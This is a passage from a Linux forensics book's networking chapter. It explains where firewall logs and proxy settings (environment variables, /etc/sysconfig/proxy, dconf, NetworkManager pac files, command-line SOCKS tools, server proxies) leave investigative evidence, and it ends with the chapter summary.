<p class="noindent">These application layer IP controls don’t need to filter based on port numbers if they are listening only on one port.</p>&#13;
<p class="indent">From a forensics perspective, any logs containing blocked packets may be interesting. They show attempted connections and scanning activity that may be related to a compromise. They also reveal information about the location or state of a machine (possibly a roaming laptop) at a certain time. If the source MAC addresses are logged, they indicate the MAC addresses of sending machines on a locally attached network (a router typically). In the case of DDoS attacks, scanning, or other blocked malicious activity, the IP addresses used can be correlated with other intelligence data to gather more information about threat actors (possibly attributing them to a particular botnet).</p>&#13;
<h4 class="h4" id="ch00lev2_120"><span epub:type="pagebreak" id="page_252"/><strong><em>Proxy Settings</em></strong></h4>&#13;
<p class="noindent">Proxy servers are a form of application layer firewall designed to provide indirect access to a remote service by proxy. When proxies are used, a client machine’s network connection terminates at the proxy server together with information about the remote service. The proxy server then establishes a new connection to the remote service on the client’s behalf. The passing of information about the remote connection is built in to the proxying protocol. Some protocols, like SOCKS or HTTP CONNECT, were specifically designed as proxies for TCP sessions. Other protocols, like SMTP, have an inherent proxying model in the protocol (for example, transferring email from host to host until it arrives at an inbox).</p>&#13;
<p class="indent">On a Linux distro, proxy settings can be global for the entire system, specific to a user, or set individually in each application. The proxy server can be either a remote machine or a locally running daemon. Local proxy daemons are typically used for filtering local web traffic or acting as gateways to remote networks that are not directly accessible (like TOR, for example).</p>&#13;
<p class="indent">There are several ways a Linux system can specify system-wide proxy settings. It is up to each application to decide how to handle those settings. Depending on the application, system-wide settings may be used, partially used, or ignored completely.</p>&#13;
<p class="indent">A set of environment variables can be used to specify proxies, which can be set in the shell startup scripts or anywhere environment variables are set. In some distros, the <em>/etc/sysconfig/proxy</em> file, which contains proxy variables, is read at startup, as shown in the following example:</p>&#13;
<pre>PROXY_ENABLED="yes"&#13;
HTTP_PROXY="http://proxy.example.com:8888"&#13;
HTTPS_PROXY="http://proxy.example.com:8888"&#13;
FTP_PROXY="http://proxy.example.com:8888"&#13;
GOPHER_PROXY=""&#13;
SOCKS_PROXY=""&#13;
SOCKS5_SERVER=""&#13;
NO_PROXY="localhost,127.0.0.1,example.com,myhiddendomain.com"</pre>&#13;
<p class="noindent">The <code>NO_PROXY</code> setting ignores proxy settings for defined hosts, IP ranges, and domains. This is interesting from a forensics perspective, as it may contain domain names and network addresses, explicitly configured by a system administrator, that are not public and are possibly relevant to an investigation.</p>&#13;
<p class="indent">A user’s dconf database also stores proxy settings that can be read by any supported application (like GNOME 3 or 40 applications). This information is stored in a <em>GVariant</em> database file in the user’s home directory (<em>~/.config/dconf/user/</em>). <a href="ch10.xhtml">Chapter 10</a> explains how to extract and analyze dconf database contents.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_253"/>The NetworkManager daemon has an option to discover and configure web proxy settings using <em>proxy auto configuration (pac</em>) files. A <em>pac</em> file uses JavaScript to define if and how URLs are to be proxied. Proxy <em>pac</em> files can be local or fetched from remote servers, and they can be found in the <code>[proxy]</code> section of network profiles stored in the <em>/etc/NetworkManager/system -connections/</em> directory.</p>&#13;
<p class="indent">Each installed network application may have its own proxy settings that deviate from the system-wide proxy settings, which, in a forensic investigation, means that relevant applications need to be examined individually.</p>&#13;
<p class="indent">Command line proxies may also be used for starting applications. For example, <code>tsocks</code> and <code>socksify</code> are tools that allow programs to be started on the command line using SOCKS libraries to proxy network traffic (designed for programs with no proxy support). Evidence of command line proxying might be found in the shell history.</p>&#13;
<p class="indent">The examples above refer to clients using proxies, but Linux servers may also be running as proxy servers. Popular web proxies running on Linux include Squid and Polipo. Dante is another popular SOCKS proxy server.</p>&#13;
<p class="indent">Nginx provides support for several proxy protocols and can also act as a reverse proxy. A reverse proxy “impersonates” a remote server, accepting connections from clients while establishing a separate connection to the real server. Reverse proxying is common in enterprise environments for load balancing and web application firewalling (WAF). Reverse proxying is also how some anonymizer systems function.</p>&#13;
<p class="indent">A malicious use of reverse proxies is real-time-phishing attacks, where the reverse proxy performs an application layer man-in-the-middle attack between a victim client and server. Botnet command-and-control servers may also use reverse proxies for resilience against takedowns and for anonymization.</p>&#13;
<p class="indent">Server-side proxies typically log client connections and activity, which can be analyzed in a forensic investigation. This is especially valuable in the case of seized malicious servers, because lists of client PCs (possibly infected victims from a botnet) can be extracted.</p>&#13;
<h3 class="h3" id="ch00lev1_42"><strong>Summary</strong></h3>&#13;
<p class="noindent">This chapter described how to analyze Linux networking, including the hardware layer dealing with interfaces and MAC addresses, network services, and DNS resolution. It also covered how to identify Wi-Fi artifacts and paired Bluetooth devices and analyze WWAN mobile activity. In addition, this chapter also explored Linux network security such as VPNs, firewalls, and proxies.<span epub:type="pagebreak" id="page_254"/></p>&#13;
</div></body></html>